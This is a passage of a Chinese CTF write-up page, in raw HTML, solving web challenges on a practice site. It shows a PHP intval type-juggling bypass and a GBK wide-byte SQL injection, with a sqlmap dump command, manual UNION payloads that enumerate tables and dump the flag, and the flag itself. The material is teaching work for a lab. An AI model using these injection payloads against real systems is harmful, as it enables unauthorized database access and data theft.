style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-15>15</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>TIP</span><span style=color:#f92672>:</span><span style=color:#a6e22e>sql</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>($_GET[<span style=color:#a6e22e>id</span>]) {
</span></span><span style=display:flex><span>   <span style=color:#a6e22e>mysql_connect</span>(<span style=color:#a6e22e>SAE_MYSQL_HOST_M</span> <span style=color:#f92672>.</span> <span style=color:#e6db74>&#39;:&#39;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>SAE_MYSQL_PORT</span>,<span style=color:#a6e22e>SAE_MYSQL_USER</span>,<span style=color:#a6e22e>SAE_MYSQL_PASS</span>);
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>mysql_select_db</span>(<span style=color:#a6e22e>SAE_MYSQL_DB</span>);
</span></span><span style=display:flex><span>  $id <span style=color:#f92672>=</span> <span style=color:#a6e22e>intval</span>($_GET[<span style=color:#a6e22e>id</span>]);
</span></span><span style=display:flex><span>  $query <span style=color:#f92672>=</span> <span style=color:#f92672>@</span><span style=color:#a6e22e>mysql_fetch_array</span>(<span style=color:#a6e22e>mysql_query</span>(<span style=color:#e6db74>&#34;select content from ctf2 where id=&#39;</span><span style=color:#e6db74>$id</span><span style=color:#e6db74>&#39;&#34;</span>));
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ($_GET[<span style=color:#a6e22e>id</span>]<span style=color:#f92672>==</span><span style=color:#ae81ff>1024</span>) {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;p&gt;no! try again&lt;/p&gt;&#34;</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>echo</span>($query[<span style=color:#a6e22e>content</span>]);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></td></tr></table></div></div><p>说明要向sql.php提交一个id，使得<code>intval($_GET[id])</code>为1024而<code>$_GET[id]==1024</code>为假。intval识别到非数字的那一位，而松散比较前的强制类型转换会把<code>e</code>当作科学计数法的一部分处理，所以可以提交<code>id=1024e1</code>等，如访问<code>http://chinalover.sinaapp.com/web11/sql.php?id=1024e1</code>。</p><blockquote><p>1、robots.txt可能藏有提示</p><p>2、<code>int intval ( mixed $var [, int $base = 10 ] )</code>只取<code>/\d*/</code>的部分。</p></blockquote><h4 id=sql-injection-3httpchinaloversinaappcomsql-gbkindexphpid1><a href="http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1">sql injection 3</a><a hidden class=anchor aria-hidden=true href=#sql-injection-3httpchinaloversinaappcomsql-gbkindexphpid1>#</a></h4><p><em>nctf{gbk_3sqli}</em></p><p>分别访问<code>id=2</code>和<code>id=3</code>得到提示<code>gbk_sql_injection</code>和<code>the fourth table</code>，所以是存在宽字节注入，flag在第四个表里面。上sqlmap跑一跑，最后一步是这样：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>python sqlmap.py -u &#34;http://chinalover.sinaapp.com/SQL-GBK/index.php?id=1%d6&#39;&#34; -T ctf4 -C flag --dump
</span></span></code></pre></td></tr></table></div></div><p>也可以手注：</p><h5 id=步骤一确认该点存在注入>步骤一：确认该点存在注入<a hidden class=anchor aria-hidden=true href=#步骤一确认该点存在注入>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-5>5</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#a6e22e>chinalover</span><span style=color:#f92672>.</span><span style=color:#a6e22e>sinaapp</span><span style=color:#f92672>.</span><span style=color:#a6e22e>com</span><span style=color:#f92672>/</span><span style=color:#a6e22e>SQL</span><span style=color:#f92672>-</span><span style=color:#a6e22e>GBK</span><span style=color:#f92672>/</span><span style=color:#a6e22e>index</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span><span style=color:#f92672>?</span><span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#ae81ff>2</span>  <span style=color:#a6e22e>和</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#a6e22e>chinalover</span><span style=color:#f92672>.</span><span style=color:#a6e22e>sinaapp</span><span style=color:#f92672>.</span><span style=color:#a6e22e>com</span><span style=color:#f92672>/</span><span style=color:#a6e22e>SQL</span><span style=color:#f92672>-</span><span style=color:#a6e22e>GBK</span><span style=color:#f92672>/</span><span style=color:#a6e22e>index</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span><span style=color:#f92672>?</span><span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#ae81ff>2</span><span style=color:#f92672>%</span><span style=color:#a6e22e>d6</span><span style=color:#f92672>%</span><span style=color:#ae81ff>27</span><span style=color:#f92672>--+</span> 
</span></span><span style=display:flex><span><span style=color:#a6e22e>返回结果相同。</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>由于MySQL执行查询时会跳过畸形字符，而</span> <span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#ae81ff>2</span><span style=color:#f92672>%</span><span style=color:#a6e22e>d6</span><span style=color:#f92672>%</span><span style=color:#ae81ff>27</span><span style=color:#f92672>--+</span>  <span style=color:#a6e22e>经过转义变为id</span><span style=color:#f92672>=</span><span style=color:#ae81ff>2</span><span style=color:#f92672>%</span><span style=color:#a6e22e>d6</span><span style=color:#f92672>%</span><span style=color:#ae81ff>5</span><span style=color:#a6e22e>c</span><span style=color:#f92672>%</span><span style=color:#ae81ff>27</span><span style=color:#f92672>--+</span> <span style=color:#a6e22e>，</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>其中</span><span style=color:#f92672>%</span><span style=color:#a6e22e>d6</span><span style=color:#f92672>%</span><span style=color:#ae81ff>5</span><span style=color:#a6e22e>c被合在一起解释，也就是id</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;2Ö&#39;</span><span style=color:#f92672>--</span> <span style=color:#a6e22e>效果等价于</span> <span style=color:#a6e22e>id</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;2&#39;</span><span style=color:#f92672>--</span><span style=color:#a6e22e>，但我们获得了执行sql的机会。</span>
</span></span></code></pre></td></tr></table></div></div><h5 id=步骤二查询数据库名>步骤二：查询数据库名<a hidden class=anchor aria-hidden=true href=#步骤二查询数据库名>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-3>3</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>发现支持union查询</span> <span style=color:#a6e22e>，</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#a6e22e>chinalover</span><span style=color:#f92672>.</span><span style=color:#a6e22e>sinaapp</span><span style=color:#f92672>.</span><span style=color:#a6e22e>com</span><span style=color:#f92672>/</span><span style=color:#a6e22e>SQL</span><span style=color:#f92672>-</span><span style=color:#a6e22e>GBK</span><span style=color:#f92672>/</span><span style=color:#a6e22e>index</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span><span style=color:#f92672>?</span><span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#ae81ff>2</span><span style=color:#f92672>%</span><span style=color:#a6e22e>d6</span><span style=color:#f92672>%</span><span style=color:#ae81ff>27</span><span style=color:#f92672>+</span><span style=color:#66d9ef>and</span><span style=color:#f92672>+</span><span style=color:#ae81ff>0</span><span style=color:#f92672>+</span><span style=color:#a6e22e>union</span><span style=color:#f92672>+</span><span style=color:#a6e22e>select</span><span style=color:#f92672>+</span><span style=color:#66d9ef>null</span>,<span style=color:#a6e22e>database</span>()<span style=color:#f92672>--+</span> 
</span></span><span style=display:flex><span><span style=color:#a6e22e>，之所以要加and</span><span style=color:#f92672>+</span><span style=color:#ae81ff>0</span><span style=color:#f92672>+</span><span style=color:#a6e22e>是因为显示点只有一处，必须让原来的查询失败。得到数据库名为</span><span style=color:#e6db74>&#39;sae-chinalover&#39;</span><span style=color:#a6e22e>。</span>
</span></span></code></pre></td></tr></table></div></div><h5 id=步骤三查询名为sae-chinalover的数据库的表的数量和名字>步骤三：查询名为&rsquo;sae-chinalover&rsquo;的数据库的表的数量和名字<a hidden class=anchor aria-hidden=true href=#步骤三查询名为sae-chinalover的数据库的表的数量和名字>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-6>6</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#a6e22e>chinalover</span><span style=color:#f92672>.</span><span style=color:#a6e22e>sinaapp</span><span style=color:#f92672>.</span><span style=color:#a6e22e>com</span><span style=color:#f92672>/</span><span style=color:#a6e22e>SQL</span><span style=color:#f92672>-</span><span style=color:#a6e22e>GBK</span><span style=color:#f92672>/</span><span style=color:#a6e22e>index</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span><span style=color:#f92672>?</span><span style=color:#a6e22e>id</span><span style=color:#f92672>=</span><span style=color:#ae81ff>2</span><span style=color:#f92672>%</span><span style=color:#a6e22e>d6</span><span style=color:#e6db74>&#39;+and+0+union+select+null,count(*)+from+information_schema.tables+where+table_schema=database()--+
</span></span></span><span style=display:flex><span><span style=color:#e6db74>得到目前的数据库含有5张表
</span></span></span><span style=display:flex><span><span style=color:#e6db74>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6&#39;</span><span style=color:#f92672>+</span><span style=color:#66d9ef>and</span><span style=color:#f92672>+</span><span style=color:#ae81ff>0</span><span style=color:#f92672>+</span><span style=color:#a6e22e>union</span><span style=color:#f92672>+</span><span style=color:#a6e22e>select</span><span style=color:#f92672>+</span><span style=color:#66d9ef>null</span>,<span style=color:#a6e22e>table_name</span><span style=color:#f92672>+</span><span style=color:#a6e22e>from</span><span style=color:#f92672>+</span><span style=color:#a6e22e>information_schema</span><span style=color:#f92672>.</span><span style=color:#a6e22e>tables</span><span style=color:#f92672>+</span><span style=color:#a6e22e>where</span><span style=color:#f92672>+</span><span style=color:#a6e22e>table_schema</span><span style=color:#f92672>=</span><span style=color:#a6e22e>database</span>()<span style=color:#f92672>+</span><span style=color:#a6e22e>limit</span><span style=color:#f92672>+</span><span style=color:#ae81ff>3</span>,<span style=color:#ae81ff>1</span><span style=color:#f92672>--+</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>得到第四张表表名为</span><span style=color:#e6db74>&#39;ctf4&#39;</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>MySQL的information_schema数据库包含所有数据库的元信息，其中的tables表包含其他数据库的数据库名、表名、表类型、创建时间等许多信息，其中table_schema列为数据库名，table_name列为表名。因为能显示出来的记录有限，所以必须用limit来控制要显示第几条记录，否则只能显示第一条。</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>limit用法是这样LIMIT</span> {[<span style=color:#a6e22e>offset</span>,] <span style=color:#a6e22e>row_count</span> <span style=color:#f92672>|</span> <span style=color:#a6e22e>row_count</span> <span style=color:#a6e22e>OFFSET</span> <span style=color:#a6e22e>offset</span>}<span style=color:#a6e22e>，必须放在where后面。</span>
</span></span></code></pre></td></tr></table></div></div><h5 id=步骤四查询表ctf4中的flag>步骤四：查询表&rsquo;ctf4&rsquo;中的flag<a hidden class=anchor aria-hidden=true href=#步骤四查询表ctf4中的flag>#</a></h5><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-4>4</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span>http:<span style=color:#f92672>//</span>chinalover.sinaapp.com<span style=color:#f92672>/</span><span style=color:#66d9ef>SQL</span><span style=color:#f92672>-</span>GBK<span style=color:#f92672>/</span><span style=color:#66d9ef>index</span>.php<span style=color:#f92672>?</span>id<span style=color:#f92672>=</span><span style=color:#ae81ff>2</span><span style=color:#f92672>%</span>d6<span style=color:#e6db74>&#39;+and+0+union+select+null,count(*)+from+ctf4--+
</span></span></span><span style=display:flex><span><span style=color:#e6db74>发现该表只有一条记录
</span></span></span><span style=display:flex><span><span style=color:#e6db74>http://chinalover.sinaapp.com/SQL-GBK/index.php?id=2%d6&#39;</span><span style=color:#f92672>+</span><span style=color:#66d9ef>and</span><span style=color:#f92672>+</span><span style=color:#ae81ff>0</span><span style=color:#f92672>+</span><span style=color:#66d9ef>union</span><span style=color:#f92672>+</span><span style=color:#66d9ef>select</span><span style=color:#f92672>+</span><span style=color:#66d9ef>null</span>,flag<span style=color:#f92672>+</span><span style=color:#66d9ef>from</span><span style=color:#f92672>+</span>ctf4<span style=color:#75715e>--+
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#960050;background-color:#1e0010>猜测列名为</span>flag<span style=color:#960050;background-color:#1e0010>，查询得到</span>flag
</span></span></code></pre></td></tr></table></div></div><p>附一个<a href=https://dev.mysql.com/doc/refman/5.7/en/select.html>select查询语法</a></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-23>23</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#66d9ef>SELECT</span>
</span></span><span style=display:flex><span>    [<span style=color:#66d9ef>ALL</span> <span style=color:#f92672>|</span> <span style=color:#66d9ef>DISTINCT</span> <span style=color:#f92672>|</span> DISTINCTROW ]
</span></span><span style=display:flex><span>      [HIGH_PRIORITY]
</span></span><span style=display:flex><span>      [STRAIGHT_JOIN]
</span></span><span style=display:flex><span>      [SQL_SMALL_RESULT] [SQL_BIG_RESULT] [SQL_BUFFER_RESULT]
</span></span><span style=display:flex><span>      [SQL_CACHE <span style=color:#f92672>|</span> SQL_NO_CACHE] [SQL_CALC_FOUND_ROWS]
</span></span><span style=display:flex><span>    select_expr [, select_expr ...]
</span></span><span style=display:flex><span>    [<span style=color:#66d9ef>FROM</span> table_references
</span></span><span style=display:flex><span>      [PARTITION partition_list]
</span></span><span style=display:flex><span>    [<span style=color:#66d9ef>WHERE</span> where_condition]
</span></span><span style=display:flex><span>    [<span style=color:#66d9ef>GROUP</span> <span style=color:#66d9ef>BY</span> <span style=color:#960050;background-color:#1e0010>{</span>col_name <span style=color:#f92672>|</span> expr <span style=color:#f92672>|</span> <span style=color:#66d9ef>position</span><span style=color:#960050;background-color:#1e0010>}</span>
</span></span><span style=display:flex><span>      [<span style=color:#66d9ef>ASC</span> <span style=color:#f92672>|</span> <span style=color:#66d9ef>DESC</span>], ... [<span style=color:#66d9ef>WITH</span> <span style=color:#66d9ef>ROLLUP</span>]]
</span></span><span style=display:flex><span>    [<span style=color:#66d9ef>HAVING</span> where_condition]
